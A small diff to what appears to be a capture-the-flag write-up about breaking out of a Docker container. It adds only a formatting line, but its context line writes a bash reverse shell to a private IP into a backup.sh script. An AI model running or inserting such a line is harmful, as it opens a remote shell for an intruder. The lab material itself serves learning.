@@ -737,6 +737,7 @@ echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.8.47.102/9999 0>&1" 
 >[!note]
 > ### After we know that we are in container from **`.dockerenv`**
 > <img width="729" height="150" alt="image" src="https://github.com/user-attachments/assets/c021c362-eda4-45cd-afb7-1ec7fe70b0f6" />
+>
 > ### and we found **`/opt/backups`** that have
 > - backup.sh
 > - backup.tar
